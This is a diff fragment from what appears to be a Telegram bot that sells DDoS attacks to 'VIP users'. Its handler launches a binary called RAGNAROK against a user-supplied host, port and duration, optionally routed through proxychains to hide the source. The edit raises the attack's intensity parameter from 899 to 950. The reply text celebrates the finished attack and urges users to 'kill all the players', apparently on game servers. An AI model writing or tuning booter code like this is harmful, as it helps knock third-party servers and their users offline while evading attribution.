@@ -340,10 +340,10 @@ def handle_attack(message):
                 # Use a proxy if available
                 proxy = get_random_proxy()
                 if proxy:
-                    full_command = f"proxychains4 -q ./RAGNAROK {target} {port} {time} 899"
+                    full_command = f"proxychains4 -q ./RAGNAROK {target} {port} {time} 950"
                     os.environ['PROXYCHAINS_PROXY'] = proxy
                 else:
-                    full_command = f"./RAGNAROK {target} {port} {time} 899"
+                    full_command = f"./RAGNAROK {target} {port} {time} 950"
                     subprocess.run(full_command, shell=True)
                 response = f"💎 𝐃𝐄𝐀𝐑 𝐕𝐈𝐏 𝐔𝐒𝐄𝐑 {user_name} 💎\n\n🛑 𝐘𝐎𝐔𝐑 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 🛑\n\n🎯 𝐇𝐨𝐬𝐭: {target}\n🔗 𝐏𝐨𝐫𝐭: {port}\n⏳ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n⚙️ 𝐌𝐞𝐭𝐡𝐨𝐝 : PREMIUM\n\n📝 𝐀𝐝𝐯𝐢𝐜𝐞 :-\n📶 𝐘𝐨𝐮𝐫 𝐈𝐧𝐭𝐞𝐫𝐧𝐞𝐭 𝐈𝐬 𝐍𝐨𝐫𝐦𝐚𝐥 𝐍𝐨𝐰 𝐊𝐢𝐥𝐥 𝐀𝐥𝐥 𝐓𝐡𝐞 𝐏𝐥𝐚𝐲𝐞𝐫'𝐬 𝐀𝐧𝐝 𝐆𝐢𝐯𝐞 𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤𝐬 𝐈𝐧"
         else:
